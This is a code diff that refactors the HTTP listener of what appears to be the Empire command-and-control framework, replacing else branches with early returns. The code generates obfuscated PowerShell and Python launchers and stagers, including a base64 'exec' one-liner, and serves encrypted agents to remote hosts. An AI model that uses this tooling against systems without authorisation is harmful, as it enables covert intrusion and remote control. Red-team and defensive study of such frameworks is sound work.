@@ -374,9 +374,8 @@ class Listener:
                 (not obfuscate) or ("launcher" not in obfuscation_command.lower())
             ):
                 return helpers.powershell_launcher(stager, launcher)
-            else:
-                # otherwise return the case-randomized stager
-                return stager
+            # otherwise return the case-randomized stager
+            return stager
 
         if language in ["python", "ironpython"]:
             # Python
@@ -482,8 +481,7 @@ class Listener:
                 if isinstance(launchEncoded, bytes):
                     launchEncoded = launchEncoded.decode("UTF-8")
                 return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
-            else:
-                return launcherBase
+            return launcherBase
 
         # very basic csharp implementation
         if language == "csharp":
@@ -514,16 +512,12 @@ class Listener:
                     f"{listenerName} csharpserver plugin not running"
                 )
                 return None
-            else:
-                return compiler.do_send_stager(
-                    stager_yaml, "Sharpire", confuse=obfuscate
-                )
+            return compiler.do_send_stager(stager_yaml, "Sharpire", confuse=obfuscate)
 
-        else:
-            self.instance_log.error(
-                f"{listenerName}: listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."
-            )
-            return None
+        self.instance_log.error(
+            f"{listenerName}: listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."
+        )
+        return None
 
     def generate_stager(
         self,
@@ -605,15 +599,14 @@ class Listener:
             # if/else statements are irrelevant
             if encode:
                 return helpers.enc_powershell(stager)
-            elif encrypt:
+            if encrypt:
                 RC4IV = os.urandom(4)
                 return RC4IV + encryption.rc4(
                     RC4IV + stagingKey, stager.encode("UTF-8")
                 )
-            else:
-                return stager
+            return stager
 
-        elif language.lower() == "python":
+        if language.lower() == "python":
             template_path = [
                 os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                 os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
@@ -648,15 +641,13 @@ class Listener:
                 return RC4IV + encryption.rc4(
                     RC4IV + stagingKey.encode("UTF-8"), stager.encode("UTF-8")
                 )
-            else:
-                # otherwise return the standard stager
-                return stager
+            # otherwise return the standard stager
+            return stager
 
-        else:
-            log.error(
-                "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-            )
-            return None
+        log.error(
+            "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+        )
+        return None
 
     def generate_agent(
         self,
@@ -711,7 +702,7 @@ class Listener:
                 code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
             return code
 
-        elif language == "python":
+        if language == "python":
             if version == "ironpython":
                 f = self.mainMenu.installPath + "/data/agent/ironpython_agent.py"
             else:
@@ -739,14 +730,14 @@ class Listener:
                 code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             return code
-        elif language == "csharp":
+        if language == "csharp":
             # currently the agent is stagless so do nothing
             return ""
-        else:
-            log.error(
-                "listeners/http generate_agent(): invalid language specification, only 'powershell', 'python', & 'csharp' are currently supported for this module."
-            )
-            return None
+
+        log.error(
+            "listeners/http generate_agent(): invalid language specification, only 'powershell', 'python', & 'csharp' are currently supported for this module."
+        )
+        return None
 
     def generate_comms(self, listenerOptions, language=None):
         """
@@ -756,46 +747,45 @@ class Listener:
         """
         host = listenerOptions["Host"]["Value"]
 
-        if language:
-            if language.lower() == "powershell":
-                template_path = [
-                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
-                ]
-
-                eng = templating.TemplateEngine(template_path)
-                template = eng.get_template("http/comms.ps1")
-
-                template_options = {
-                    "session_cookie": self.session_cookie,
-                    "host": host,
-                }
-
-                return template.render(template_options)
-
-            elif language.lower() == "python":
-                template_path = [
-                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
-                ]
-                eng = templating.TemplateEngine(template_path)
-                template = eng.get_template("http/comms.py")
-
-                template_options = {
-                    "session_cookie": self.session_cookie,
-                    "host": host,
-                }
-
-                return template.render(template_options)
-
-            else:
-                log.error(
-                    "listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-                )
-                return None
-        else:
+        if not language:
             log.error("listeners/http generate_comms(): no language specified!")
             return None
+
+        if language.lower() == "powershell":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
+
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http/comms.ps1")
+
+            template_options = {
+                "session_cookie": self.session_cookie,
+                "host": host,
+            }
+
+            return template.render(template_options)
+
+        if language.lower() == "python":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("http/comms.py")
+
+            template_options = {
+                "session_cookie": self.session_cookie,
+                "host": host,
+            }
+
+            return template.render(template_options)
+
+        log.error(
+            "listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+        )
+        return None
 
     def start_server(self, listenerOptions):
         """
@@ -860,7 +850,7 @@ class Listener:
                     proxyCreds=proxyCreds,
                 )
 
-            elif stager == "python":
+            if stager == "python":
                 return self.mainMenu.stagers.generate_launcher(
                     listenerName=hop or listenerName,
                     language="python",
@@ -872,7 +862,7 @@ class Listener:
                     proxyCreds=proxyCreds,
                 )
 
-            elif stager == "ironpython":
+            if stager == "ironpython":
                 if hop:
                     options = copy.deepcopy(self.options)
                     options["Listener"] = {}
@@ -1007,101 +997,90 @@ class Listener:
                     routingPacket = None
                     pass
 
-            if routingPacket:
-                # parse the routing packet and process the results
-
-                dataResults = self.mainMenu.agents.handle_agent_data(
-                    stagingKey, routingPacket, listenerOptions, clientIP
-                )
-                if dataResults and len(dataResults) > 0:
-                    for language, results in dataResults:
-                        if results:
-                            if isinstance(results, str):
-                                results = results.encode("UTF-8")
-                            if results == b"STAGE0":
-                                # handle_agent_data() signals that the listener should return the stager.ps1 code
-                                # step 2 of negotiation -> return stager.ps1 (stage 1)
-                                message = f"{listenerName}: Sending {language} stager (stage 1) to {clientIP}"
-                                self.instance_log.info(message)
-                                log.info(message)
-
-                                # Check for hop listener
-                                hopListenerName = request.headers.get("Hop-Name")
-                                hopListener = self.mainMenu.listenersv2.get_active_listener_by_name(
-                                    hopListenerName
-                                )
-
-                                with SessionLocal() as db:
-                                    obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
-                                        db, language
-                                    )
-
-                                    if hopListener:
-                                        stage = hopListener.generate_stager(
-                                            language=language,
-                                            listenerOptions=hopListener.options,
-                                            obfuscate=(
-                                                False
-                                                if not obf_config
-                                                else obf_config.enabled
-                                            ),
-                                            obfuscation_command=(
-                                                ""
-                                                if not obf_config
-                                                else obf_config.command
-                                            ),
-                                        )
-
-                                    else:
-                                        stage = self.generate_stager(
-                                            language=language,
-                                            listenerOptions=listenerOptions,
-                                            obfuscate=(
-                                                False
-                                                if not obf_config
-                                                else obf_config.enabled
-                                            ),
-                                            obfuscation_command=(
-                                                ""
-                                                if not obf_config
-                                                else obf_config.command
-                                            ),
-                                        )
-                                return make_response(stage, 200)
-
-                            elif results.startswith(b"ERROR:"):
-                                listenerName = self.options["Name"]["Value"]
-                                message = f"{listenerName}: Error from agents.handle_agent_data() for {request_uri} from {clientIP}: {results}"
-                                self.instance_log.error(message)
-
-                                if b"not in cache" in results:
-                                    # signal the client to restage
-                                    log.info(
-                                        f"{listenerName}: Orphaned agent from {clientIP}, signaling restaging"
-                                    )
-                                    return make_response(self.default_response(), 401)
-                                else:
-                                    return make_response(self.default_response(), 200)
-
-                            else:
-                                # actual taskings
-                                listenerName = self.options["Name"]["Value"]
-                                message = f"{listenerName}: Agent from {clientIP} retrieved taskings"
-                                self.instance_log.info(message)
-                                return make_response(results, 200)
-                        else:
-                            message = f"{listenerName}: Results are None for {request_uri} from {clientIP}"
-                            self.instance_log.debug(message)
-                            return make_response(self.default_response(), 200)
-                    return None
-                else:
-                    return make_response(self.default_response(), 200)
-
-            else:
+            if not routingPacket:
                 listenerName = self.options["Name"]["Value"]
                 message = f"{listenerName}: {request_uri} requested by {clientIP} with no routing packet."
                 self.instance_log.error(message)
                 return make_response(self.default_response(), 404)
+
+            # parse the routing packet and process the results
+            dataResults = self.mainMenu.agents.handle_agent_data(
+                stagingKey, routingPacket, listenerOptions, clientIP
+            )
+
+            if not dataResults or len(dataResults) <= 0:
+                return make_response(self.default_response(), 200)
+
+            for language, results in dataResults:
+                if not results:
+                    message = f"{listenerName}: Results are None for {request_uri} from {clientIP}"
+                    self.instance_log.debug(message)
+                    return make_response(self.default_response(), 200)
+
+                if isinstance(results, str):
+                    results = results.encode("UTF-8")
+                if results == b"STAGE0":
+                    # handle_agent_data() signals that the listener should return the stager.ps1 code
+                    # step 2 of negotiation -> return stager.ps1 (stage 1)
+                    message = f"{listenerName}: Sending {language} stager (stage 1) to {clientIP}"
+                    self.instance_log.info(message)
+                    log.info(message)
+
+                    # Check for hop listener
+                    hopListenerName = request.headers.get("Hop-Name")
+                    hopListener = self.mainMenu.listenersv2.get_active_listener_by_name(
+                        hopListenerName
+                    )
+
+                    with SessionLocal() as db:
+                        obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
+                            db, language
+                        )
+
+                        if hopListener:
+                            stage = hopListener.generate_stager(
+                                language=language,
+                                listenerOptions=hopListener.options,
+                                obfuscate=(
+                                    False if not obf_config else obf_config.enabled
+                                ),
+                                obfuscation_command=(
+                                    "" if not obf_config else obf_config.command
+                                ),
+                            )
+
+                        else:
+                            stage = self.generate_stager(
+                                language=language,
+                                listenerOptions=listenerOptions,
+                                obfuscate=(
+                                    False if not obf_config else obf_config.enabled
+                                ),
+                                obfuscation_command=(
+                                    "" if not obf_config else obf_config.command
+                                ),
+                            )
+                    return make_response(stage, 200)
+
+                if results.startswith(b"ERROR:"):
+                    listenerName = self.options["Name"]["Value"]
+                    message = f"{listenerName}: Error from agents.handle_agent_data() for {request_uri} from {clientIP}: {results}"
+                    self.instance_log.error(message)
+
+                    if b"not in cache" in results:
+                        # signal the client to restage
+                        log.info(
+                            f"{listenerName}: Orphaned agent from {clientIP}, signaling restaging"
+                        )
+                        return make_response(self.default_response(), 401)
+                    return make_response(self.default_response(), 200)
+
+                # actual taskings
+                listenerName = self.options["Name"]["Value"]
+                message = f"{listenerName}: Agent from {clientIP} retrieved taskings"
+                self.instance_log.info(message)
+                return make_response(results, 200)
+            return None
 
         @app.route("/<path:request_uri>", methods=["POST"])
         def handle_post(request_uri):
@@ -1121,106 +1100,94 @@ class Listener:
             dataResults = self.mainMenu.agents.handle_agent_data(
                 stagingKey, requestData, listenerOptions, clientIP
             )
-            if dataResults and len(dataResults) > 0:
-                for language, results in dataResults:
-                    if isinstance(results, str):
-                        results = results.encode("UTF-8")
-
-                    if results:
-                        if results.startswith(b"STAGE2"):
-                            # TODO: document the exact results structure returned
-                            if ":" in clientIP:
-                                clientIP = "[" + str(clientIP) + "]"
-                            sessionID = results.split(b" ")[1].strip().decode("UTF-8")
-                            sessionKey = self.mainMenu.agents.agents[sessionID][
-                                "sessionKey"
-                            ]
-
-                            listenerName = self.options["Name"]["Value"]
-                            message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
-                            self.instance_log.info(message)
-                            log.info(message)
-
-                            hopListenerName = request.headers.get("Hop-Name")
-
-                            # Check for hop listener
-                            hopListener = data_util.get_listener_options(
-                                hopListenerName
-                            )
-                            tempListenerOptions = copy.deepcopy(listenerOptions)
-                            if hopListener is not None:
-                                tempListenerOptions["Host"]["Value"] = (
-                                    hopListener.options["Host"]["Value"]
-                                )
-                                with SessionLocal.begin() as db:
-                                    db_agent = self.mainMenu.agentsv2.get_by_id(
-                                        db, sessionID
-                                    )
-                                    db_agent.listener = hopListenerName
-                            else:
-                                tempListenerOptions = listenerOptions
-
-                            session_info = (
-                                SessionLocal()
-                                .query(models.Agent)
-                                .filter(models.Agent.session_id == sessionID)
-                                .first()
-                            )
-                            if session_info.language == "ironpython":
-                                version = "ironpython"
-                            else:
-                                version = ""
-
-                            # step 6 of negotiation -> server sends patched agent.ps1/agent.py
-                            with SessionLocal() as db:
-                                obf_config = (
-                                    self.mainMenu.obfuscationv2.get_obfuscation_config(
-                                        db, language
-                                    )
-                                )
-                                agentCode = self.generate_agent(
-                                    language=language,
-                                    listenerOptions=tempListenerOptions,
-                                    obfuscate=(
-                                        False if not obf_config else obf_config.enabled
-                                    ),
-                                    obfuscation_command=(
-                                        "" if not obf_config else obf_config.command
-                                    ),
-                                    version=version,
-                                )
-
-                                if language.lower() in ["python", "ironpython"]:
-                                    sessionKey = bytes.fromhex(sessionKey)
-
-                                encryptedAgent = encryption.aes_encrypt_then_hmac(
-                                    sessionKey, agentCode
-                                )
-                                # TODO: wrap ^ in a routing packet?
-
-                                return make_response(encryptedAgent, 200)
-
-                        elif results[:10].lower().startswith(b"error") or results[
-                            :10
-                        ].lower().startswith(b"exception"):
-                            listenerName = self.options["Name"]["Value"]
-                            message = f"{listenerName}: Error returned for results by {clientIP} : {results}"
-                            self.instance_log.error(message)
-                            return make_response(self.default_response(), 404)
-                        elif results.startswith(b"VALID"):
-                            listenerName = self.options["Name"]["Value"]
-                            message = (
-                                f"{listenerName}: Valid results returned by {clientIP}"
-                            )
-                            self.instance_log.info(message)
-                            return make_response(self.default_response(), 200)
-                        else:
-                            return make_response(results, 200)
-                    else:
-                        return make_response(self.default_response(), 404)
-                return None
-            else:
+            if not dataResults or len(dataResults) <= 0:
                 return make_response(self.default_response(), 404)
+
+            for language, results in dataResults:
+                if isinstance(results, str):
+                    results = results.encode("UTF-8")
+
+                if not results:
+                    return make_response(self.default_response(), 404)
+
+                if results.startswith(b"STAGE2"):
+                    # TODO: document the exact results structure returned
+                    if ":" in clientIP:
+                        clientIP = "[" + str(clientIP) + "]"
+                    sessionID = results.split(b" ")[1].strip().decode("UTF-8")
+                    sessionKey = self.mainMenu.agents.agents[sessionID]["sessionKey"]
+
+                    listenerName = self.options["Name"]["Value"]
+                    message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
+                    self.instance_log.info(message)
+                    log.info(message)
+
+                    hopListenerName = request.headers.get("Hop-Name")
+
+                    # Check for hop listener
+                    hopListener = data_util.get_listener_options(hopListenerName)
+                    tempListenerOptions = copy.deepcopy(listenerOptions)
+                    if hopListener is not None:
+                        tempListenerOptions["Host"]["Value"] = hopListener.options[
+                            "Host"
+                        ]["Value"]
+                        with SessionLocal.begin() as db:
+                            db_agent = self.mainMenu.agentsv2.get_by_id(db, sessionID)
+                            db_agent.listener = hopListenerName
+                    else:
+                        tempListenerOptions = listenerOptions
+
+                    session_info = (
+                        SessionLocal()
+                        .query(models.Agent)
+                        .filter(models.Agent.session_id == sessionID)
+                        .first()
+                    )
+                    if session_info.language == "ironpython":
+                        version = "ironpython"
+                    else:
+                        version = ""
+
+                    # step 6 of negotiation -> server sends patched agent.ps1/agent.py
+                    with SessionLocal() as db:
+                        obf_config = self.mainMenu.obfuscationv2.get_obfuscation_config(
+                            db, language
+                        )
+                        agentCode = self.generate_agent(
+                            language=language,
+                            listenerOptions=tempListenerOptions,
+                            obfuscate=(False if not obf_config else obf_config.enabled),
+                            obfuscation_command=(
+                                "" if not obf_config else obf_config.command
+                            ),
+                            version=version,
+                        )
+
+                        if language.lower() in ["python", "ironpython"]:
+                            sessionKey = bytes.fromhex(sessionKey)
+
+                        encryptedAgent = encryption.aes_encrypt_then_hmac(
+                            sessionKey, agentCode
+                        )
+                        # TODO: wrap ^ in a routing packet?
+
+                        return make_response(encryptedAgent, 200)
+
+                elif results[:10].lower().startswith(b"error") or results[
+                    :10
+                ].lower().startswith(b"exception"):
+                    listenerName = self.options["Name"]["Value"]
+                    message = f"{listenerName}: Error returned for results by {clientIP} : {results}"
+                    self.instance_log.error(message)
+                    return make_response(self.default_response(), 404)
+                elif results.startswith(b"VALID"):
+                    listenerName = self.options["Name"]["Value"]
+                    message = f"{listenerName}: Valid results returned by {clientIP}"
+                    self.instance_log.info(message)
+                    return make_response(self.default_response(), 200)
+                else:
+                    return make_response(results, 200)
+            return None
 
         try:
             certPath = listenerOptions["CertPath"]["Value"]
